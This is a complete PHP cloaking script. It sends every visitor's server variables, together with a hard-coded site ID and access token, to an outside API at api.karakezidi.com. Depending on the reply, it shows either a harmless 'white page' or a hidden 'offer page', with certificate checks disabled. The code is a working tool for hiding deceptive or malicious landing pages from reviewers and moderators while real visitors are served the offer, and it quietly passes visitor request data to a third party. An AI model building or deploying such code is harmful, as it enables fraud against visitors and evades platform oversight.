<?php
const API_URL = 'https://api.karakezidi.com/api';
const SITE_ID = '16';
const SITE_TOKEN = 'o2C0vFwurICEJn3rwvLOuR7qmMYjN52YuhKAdGXYtCJy4ZxDCFpx0xlpzAPfzQvVHla5yNEAlyC7NiKaxhykJvCGkIMPBYDNTgKfUfQ31yl2IPLPfSSQZffL9bT3ZSfo8ggERdo2lcS8A0UO4ZEvtGJpDfhWpoHPI17Ke6GGO7lIlAclpqgUsRXCaBZv6TclkVgubjngzcz7HcblhuGwrTUKKCb5XuzoeHHnBoiPcviDAMbsLbLLOJh3IMPRWvU';
const DEBUG = false;

function echoWhitePage($whitePage){
    $ch = curl_init($whitePage);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $output = curl_exec($ch);
    curl_close($ch);

    $url = parse_url($whitePage);
    $output = preg_replace('/(href|src)="(\W+)/', '${1}="' . $url['scheme'] . '://' . $url['host'] . '/', $output);

    echo $output;
}

function echoOfferPage($offerPage){
    $ch = curl_init($offerPage);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $output = curl_exec($ch);
    curl_close($ch);

    $url = parse_url($offerPage);
    $output = preg_replace('/(href|src)="(\W*)/', '${1}="' . $url['scheme'] . '://' . $url['host'] . '/', $output);
    
    echo $output;
}

function getSiteStatus(){
    $ch = curl_init(API_URL . '/cloak');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'site_id' => SITE_ID,
        'site_token' => SITE_TOKEN,
        'server_variable' => $_SERVER
    ]));
    $output = curl_exec($ch);
    curl_close($ch);

    return json_decode($output, true);
}

function cloack(){
    $responseData = getSiteStatus();

    if($responseData && is_array($responseData) && $responseData['status']){
        if($responseData['status'] == 'success'){
            if($responseData['is_white_page']){
                echoWhitePage($responseData['white_page_url']);
            }else{
                echoOfferPage($responseData['offer_page_url']);
            }
        }elseif($responseData['white_page_url']){
            echoWhitePage($responseData['white_page_url']);
        }
    }
}

function checkCurlExtension(){
    if(!function_exists('curl_init')){
        throw new Exception("CURL module doesn't enabled");
    }
}

function checkJsonExtension(){
    if(!function_exists('json_decode')){
        throw new Exception("JSON module doesn't enabled");
    }
}

function init(){
    try{
        checkCurlExtension();
        checkJsonExtension();
        cloack();
    }catch (Exception $exception){
        if(DEBUG){
            echo $exception->getMessage();
        }
    }
}

init();